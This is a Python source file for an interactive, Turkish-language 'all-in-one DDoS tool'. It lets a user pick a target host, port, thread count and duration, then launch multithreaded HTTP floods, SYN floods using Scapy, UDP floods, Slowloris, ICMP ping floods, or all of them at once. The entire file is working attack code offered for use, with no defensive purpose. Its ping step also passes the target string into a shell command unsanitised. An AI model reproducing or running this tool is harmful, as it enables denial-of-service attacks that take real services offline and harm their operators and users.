#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║         🔥 ALL-IN-ONE DDoS TOOL V3 🔥                      ║
║                                                               ║
║   Developer : BüyükXan | Developer Xan                      ║
║                                                               ║
║   Yöntemler: HTTP Flood | SYN Flood | UDP Flood            ║
║             Slowloris | ICMP Flood | Multi-Thread          ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import random
import time
import sys
import os
import requests
import subprocess
from urllib.parse import urlparse
import ssl

# Renkler
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class DDoSTool:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 80
        self.thread_count = 100
        self.duration = 30
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        self.stop_flag = False
        self.attack_count = 0
        
    def print_banner(self):
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.YELLOW}🔥 ALL-IN-ONE DDoS TOOL V3 🔥{Colors.RED}                ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.CYAN}Developer : BüyükXan | Developer Xan{Colors.RED}         ║
{Colors.RED}║                                                               ║
{Colors.RED}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}{Colors.BLUE}╔════════════════════════════════════════════════════════╗
║                    ANA MENÜ                              ║
╠════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}1{Colors.RESET}{Colors.BLUE}) Hedef Belirle                                  ║
║  {Colors.YELLOW}2{Colors.RESET}{Colors.BLUE}) HTTP Flood                                   ║
║  {Colors.YELLOW}3{Colors.RESET}{Colors.BLUE}) SYN Flood (Sadece Linux)                     ║
║  {Colors.YELLOW}4{Colors.RESET}{Colors.BLUE}) UDP Flood                                    ║
║  {Colors.YELLOW}5{Colors.RESET}{Colors.BLUE}) Slowloris                                    ║
║  {Colors.YELLOW}6{Colors.RESET}{Colors.BLUE}) ICMP Flood (Ping of Death)                  ║
║  {Colors.YELLOW}7{Colors.RESET}{Colors.BLUE}) Multi-Method Attack                         ║
║  {Colors.YELLOW}8{Colors.RESET}{Colors.BLUE}) Durdurak                                   ║
║  {Colors.YELLOW}9{Colors.RESET}{Colors.BLUE}) Saldırı Bilgileri                           ║
║  {Colors.YELLOW}0{Colors.RESET}{Colors.BLUE}) Çıkış                                        ║
╚════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(menu)
    
    def set_target(self):
        print(f"\n{Colors.CYAN}[+] Hedef URL veya IP: (örn: https://hedef.com veya 192.168.1.1){Colors.RESET}")
        target = input("➜ ").strip()
        self.target_ip = target
        
        # Port
        print(f"{Colors.CYAN}[+] Port (varsayılan 80):{Colors.RESET}")
        port = input("➜ ").strip()
        if port:
            self.target_port = int(port)
        
        # Thread sayısı
        print(f"{Colors.CYAN}[+] Thread sayısı (varsayılan 100):{Colors.RESET}")
        threads = input("➜ ").strip()
        if threads:
            self.thread_count = int(threads)
        
        # Süre
        print(f"{Colors.CYAN}[+] Saldırı süresi (saniye, varsayılan 30):{Colors.RESET}")
        duration = input("➜ ").strip()
        if duration:
            self.duration = int(duration)
        
        print(f"\n{Colors.GREEN}✅ Hedef: {self.target_ip}:{self.target_port}")
        print(f"✅ Thread: {self.thread_count}")
        print(f"✅ Süre: {self.duration} saniye{Colors.RESET}\n")
    
    # HTTP Flood (Layer 7)
    def http_flood_worker(self):
        """HTTP Flood saldırısı - Web sunucusunu yormak için"""
        while not self.stop_flag:
            try:
                # Rastgele URL yolları
                paths = ['/', '/index.php', '/?id='+str(random.randint(1,1000)), '/login', '/admin', '/api', '/test']
                url = f"http://{self.target_ip}:{self.target_port}{random.choice(paths)}"
                
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                # GET isteği
                response = requests.get(url, headers=headers, timeout=3, verify=False)
                self.attack_count += 1
                
                if self.attack_count % 100 == 0:
                    print(f"{Colors.GREEN}[+] HTTP Flood - {self.attack_count} istek gönderildi{Colors.RESET}")
                    
            except requests.exceptions.ConnectionError:
                pass
            except requests.exceptions.Timeout:
                pass
            except requests.exceptions.RequestException:
                pass
            except Exception:
                pass
            
            time.sleep(0.01)
    
    def start_http_flood(self):
        """HTTP Flood başlat"""
        print(f"\n{Colors.RED}[!] HTTP Flood başlatılıyor...{Colors.RESET}")
        self.stop_flag = False
        self.attack_count = 0
        
        threads = []
        for i in range(self.thread_count):
            t = threading.Thread(target=self.http_flood_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(self.duration)
        self.stop_flag = True
        
        for t in threads:
            t.join(timeout=1)
        
        print(f"\n{Colors.GREEN}[+] HTTP Flood tamamlandı! {self.attack_count} istek gönderildi.{Colors.RESET}")
    
    # SYN Flood (Layer 4)
    def syn_flood_worker(self):
        """SYN Flood - TCP bağlantılarını doldur"""
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((self.target_ip, self.target_port))
                # SYN paketi gönder
                sock.sendto(b'SYN', (self.target_ip, self.target_port))
                self.attack_count += 1
                sock.close()
            except socket.error:
                pass
            except Exception:
                pass
            
            if self.attack_count % 100 == 0:
                print(f"{Colors.GREEN}[+] SYN Flood - {self.attack_count} bağlantı{Colors.RESET}")
            
            time.sleep(0.01)
    
    def start_syn_flood(self):
        """SYN Flood başlat"""
        print(f"\n{Colors.RED}[!] SYN Flood başlatılıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Sadece root yetkisiyle ve Linux'ta çalışır!{Colors.RESET}")
        
        try:
            # Scapy ile SYN Flood (daha etkili)
            from scapy.all import IP, TCP, send
            
            def send_syn():
                while not self.stop_flag:
                    try:
                        ip = IP(dst=self.target_ip)
                        tcp = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags='S')
                        send(ip/tcp, verbose=False)
                        self.attack_count += 1
                    except:
                        pass
            
            print(f"{Colors.GREEN}[+] Scapy ile SYN Flood başlatılıyor...{Colors.RESET}")
            self.stop_flag = False
            self.attack_count = 0
            
            threads = []
            for i in range(self.thread_count):
                t = threading.Thread(target=send_syn)
                t.daemon = True
                t.start()
                threads.append(t)
            
            time.sleep(self.duration)
            self.stop_flag = True
            
            for t in threads:
                t.join(timeout=1)
            
            print(f"\n{Colors.GREEN}[+] SYN Flood tamamlandı! {self.attack_count} paket gönderildi.{Colors.RESET}")
            
        except ImportError:
            print(f"{Colors.RED}❌ Scapy yüklü değil! Alternatif socket flood kullanılıyor...{Colors.RESET}")
            self.stop_flag = False
            self.attack_count = 0
            
            threads = []
            for i in range(self.thread_count):
                t = threading.Thread(target=self.syn_flood_worker)
                t.daemon = True
                t.start()
                threads.append(t)
            
            time.sleep(self.duration)
            self.stop_flag = True
            
            for t in threads:
                t.join(timeout=1)
            
            print(f"\n{Colors.GREEN}[+] SYN Flood tamamlandı! {self.attack_count} bağlantı.{Colors.RESET}")
    
    # UDP Flood (Layer 4)
    def udp_flood_worker(self):
        """UDP Flood - Rastgele UDP paketleri gönder"""
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                # Rastgele boyutta veri (1-65507 byte)
                data = random._urandom(random.randint(1, 65507))
                sock.sendto(data, (self.target_ip, self.target_port))
                self.attack_count += 1
                sock.close()
            except socket.error:
                pass
            except Exception:
                pass
            
            if self.attack_count % 100 == 0:
                print(f"{Colors.GREEN}[+] UDP Flood - {self.attack_count} paket gönderildi{Colors.RESET}")
            
            time.sleep(0.001)
    
    def start_udp_flood(self):
        """UDP Flood başlat"""
        print(f"\n{Colors.RED}[!] UDP Flood başlatılıyor...{Colors.RESET}")
        self.stop_flag = False
        self.attack_count = 0
        
        threads = []
        for i in range(self.thread_count):
            t = threading.Thread(target=self.udp_flood_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(self.duration)
        self.stop_flag = True
        
        for t in threads:
            t.join(timeout=1)
        
        print(f"\n{Colors.GREEN}[+] UDP Flood tamamlandı! {self.attack_count} paket gönderildi.{Colors.RESET}")
    
    # Slowloris (Layer 7)
    def slowloris_worker(self):
        """Slowloris - Bağlantıları yavaş yavaş doldur"""
        while not self.stop_flag:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_ip, self.target_port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"Accept: */*\r\n")
                sock.send(b"Connection: keep-alive\r\n")
                sock.send(b"X-Header: " + random._urandom(100) + b"\r\n")
                sock.send(b"Content-Length: 100\r\n")
                # Bağlantıyı açık tut, yavaş yavaş veri gönder
                while not self.stop_flag:
                    sock.send(b"X-Data: " + random._urandom(50) + b"\r\n")
                    time.sleep(5)  # Her 5 saniyede bir veri gönder
                    self.attack_count += 1
                sock.close()
            except:
                pass
    
    def start_slowloris(self):
        """Slowloris başlat"""
        print(f"\n{Colors.RED}[!] Slowloris başlatılıyor...{Colors.RESET}")
        self.stop_flag = False
        self.attack_count = 0
        
        threads = []
        for i in range(self.thread_count):
            t = threading.Thread(target=self.slowloris_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(self.duration)
        self.stop_flag = True
        
        for t in threads:
            t.join(timeout=1)
        
        print(f"\n{Colors.GREEN}[+] Slowloris tamamlandı! {self.attack_count} bağlantı.{Colors.RESET}")
    
    # ICMP Flood (Ping of Death)
    def icmp_flood_worker(self):
        """ICMP Flood - Ping of Death"""
        while not self.stop_flag:
            try:
                # Windows'ta ping komutu
                if sys.platform.startswith('win'):
                    subprocess.run(f"ping {self.target_ip} -l 65500 -f -n 1", shell=True, capture_output=True)
                else:  # Linux/Mac
                    subprocess.run(f"ping {self.target_ip} -s 65500 -f -c 1", shell=True, capture_output=True)
                self.attack_count += 1
            except:
                pass
            
            if self.attack_count % 100 == 0:
                print(f"{Colors.GREEN}[+] ICMP Flood - {self.attack_count} ping gönderildi{Colors.RESET}")
    
    def start_icmp_flood(self):
        """ICMP Flood başlat"""
        print(f"\n{Colors.RED}[!] ICMP Flood başlatılıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Root/Admin yetkisi gerekebilir!{Colors.RESET}")
        self.stop_flag = False
        self.attack_count = 0
        
        threads = []
        for i in range(self.thread_count):
            t = threading.Thread(target=self.icmp_flood_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(self.duration)
        self.stop_flag = True
        
        for t in threads:
            t.join(timeout=1)
        
        print(f"\n{Colors.GREEN}[+] ICMP Flood tamamlandı! {self.attack_count} ping gönderildi.{Colors.RESET}")
    
    # Multi-Method Attack
    def start_multi_attack(self):
        """Tüm saldırı yöntemlerini birlikte çalıştır"""
        print(f"\n{Colors.RED}[!] MULTI-ATTACK başlatılıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] HTTP + SYN + UDP + Slowloris + ICMP{Colors.RESET}")
        self.stop_flag = False
        self.attack_count = 0
        
        attacks = [
            self.http_flood_worker,
            self.syn_flood_worker,
            self.udp_flood_worker,
            self.slowloris_worker,
            self.icmp_flood_worker
        ]
        
        threads = []
        for _ in range(self.thread_count // 2):
            for attack in attacks:
                t = threading.Thread(target=attack)
                t.daemon = True
                t.start()
                threads.append(t)
        
        time.sleep(self.duration)
        self.stop_flag = True
        
        for t in threads:
            t.join(timeout=1)
        
        print(f"\n{Colors.GREEN}[+] Multi-Attack tamamlandı!{Colors.RESET}")
    
    def show_info(self):
        """Saldırı bilgilerini göster"""
        print(f"""
{Colors.BOLD}{Colors.BLUE}╔════════════════════════════════════════════════════════╗
║                    SALDIRI BİLGİLERİ                     ║
╠════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}Hedef{Colors.RESET}{Colors.BLUE}: {self.target_ip}:{self.target_port}                    ║
║  {Colors.YELLOW}Thread{Colors.RESET}{Colors.BLUE}: {self.thread_count}                                  ║
║  {Colors.YELLOW}Süre{Colors.RESET}{Colors.BLUE}: {self.duration} saniye                            ║
║  {Colors.YELLOW}Durum{Colors.RESET}{Colors.BLUE}: {'Aktif' if not self.stop_flag else 'Durdu'}      ║
║  {Colors.YELLOW}Toplam{Colors.RESET}{Colors.BLUE}: {self.attack_count} istek/paket               ║
╚════════════════════════════════════════════════════════╝
{Colors.RESET}
        """)
    
    def run(self):
        self.print_banner()
        
        while True:
            self.print_menu()
            choice = input(f"{Colors.BOLD}{Colors.CYAN}Seçiminiz (0-9): {Colors.RESET}").strip()
            
            if choice == '1':
                self.set_target()
            
            elif choice == '2':
                if not self.target_ip:
                    self.set_target()
                self.start_http_flood()
            
            elif choice == '3':
                if not self.target_ip:
                    self.set_target()
                self.start_syn_flood()
            
            elif choice == '4':
                if not self.target_ip:
                    self.set_target()
                self.start_udp_flood()
            
            elif choice == '5':
                if not self.target_ip:
                    self.set_target()
                self.start_slowloris()
            
            elif choice == '6':
                if not self.target_ip:
                    self.set_target()
                self.start_icmp_flood()
            
            elif choice == '7':
                if not self.target_ip:
                    self.set_target()
                self.start_multi_attack()
            
            elif choice == '8':
                print(f"\n{Colors.RED}[!] Saldırı durduruluyor...{Colors.RESET}")
                self.stop_flag = True
            
            elif choice == '9':
                self.show_info()
            
            elif choice == '0':
                print(f"{Colors.RED}[+] Çıkış yapılıyor...{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.CYAN}Developed by BüyükXan | Developer Xan{Colors.RESET}")
                break
            
            else:
                print(f"{Colors.RED}❌ Geçersiz seçim!{Colors.RESET}")
            
            input(f"\n{Colors.YELLOW}[*] Devam etmek için Enter tuşuna bas...{Colors.RESET}")

if __name__ == "__main__":
    try:
        tool = DDoSTool()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[+] Kullanıcı tarafından durduruldu.{Colors.RESET}")
        sys.exit(0)
